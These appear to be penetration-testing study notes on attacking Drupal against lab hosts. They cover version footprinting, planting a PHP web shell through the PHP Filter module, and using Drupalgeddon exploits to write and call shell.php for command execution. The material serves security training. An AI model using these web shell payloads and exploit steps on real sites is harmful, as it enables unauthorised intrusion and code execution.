# Drupal

## **Introduction**

> * Drupal is Written in PHP, supports MySQL or PostgreSQL for the backend. SQLite can be used if there's no DBMS installed.
> * Drupal indexes its content using nodes.
> * A node can hold anything such as a blog post, poll, article, etc.
> * The page URIs are usually of the form `/node/<nodeid>`

***

## **Drupal Discovery/Footprinting**

| Command                                                   | Description                               |
| --------------------------------------------------------- | ----------------------------------------- |
| \`curl -s http://drupal.inlanefreight.local               | grep Drupal\`                             |
| Browse to http://drupal.inlanefreight.local/CHANGELOG.txt | Check for istances of Drupal              |
| Browse to http://drupal.inlanefreight.local/README.txt    | Check for istances of Drupal              |
| Browse to http://drupal.inlanefreight.local/robots.txt    | Check for istances of Drupal or its nodes |

***

## **Attacking Drupal versions prior to version 8 \[PHP Filter Module]**

> * In Drupal versions prior to 8, it's possible to login as an admin to enable the PHP Filter Module
> * The PHP Filter Module basically allows PHP code to **always** be executed

**Follow these steps:**

1. After enabling the module, navigate to Content → Basic Page
2. Add the following RCE payload: `<?phpsystem($_GET['cmd']); ?>`
3. Note: toggle `text format` → `php code` in the options below
4. Gain RCE: `curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id \| grep uid \| cut -f4 -d">"`

***

## **Attacking Drupal version after version 8 \[PHP Filter Module]**

**Follow these steps:**

1. Download the PHP Filter Module: `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Once downloaded go to Administration → Reports → Available updates\`.
3. Click on Browse → Select the file → Install.
4. Follow the same steps as described above (same as drupal version prior to 8)

***

## **Drupalgeddon \[Drupal RCE Vulnerabilities]**

> Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed Drupalgeddon.

| CVE                            | Versions                         | Description                                                                                                         |
| ------------------------------ | -------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| CVE-2014-3704 \[Drupalgeddon]  | versions 7.0 up to 7.31          | Pre-authenticated SQL injection that could be used to upload a malicious form or create a new admin user            |
| CVE-2018-7600 \[Drupalgeddon2] | versions prior to 7.58 and 8.5.1 | Insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected |
| CVE-2018-7602 \[Drupalgeddon3] | versions 7.x and 8.x             | This **authenticated** flaw exploits improper validation in the Form API                                            |

### **Proof of Concept to exploit these vulnerabilities:**

1. Drupalgeddon: [https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992) or `exploit/multi/http/drupal_drupageddon` Metasploit module
2. Drupalgeddon2: [https://www.exploit-db.com/exploits/44448](https://www.exploit-db.com/exploits/44448)\
   Usage:
   * Run the PoC without edits to check if the vulnerability exists
   * To gain RCE, first encode the PHP payload: `echo '<?php system($_GET[cmd]);?>' | base64`
   * Edit the `echo line in the PoC` as follows: `echo "BASE64OUTPUT" | base64 -d | tee shell.php`
   * Run the script: `python3 drupalgeddon2.py`
   * Gain RCE: `curl http://drupal-dev.inlanefreight.local/shell.php?cmd=id`
3. Drupalgeddon3: [https://github.com/rithchard/Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) or [https://www.exploit-db.com/exploits/44557/](https://www.exploit-db.com/exploits/44557/)
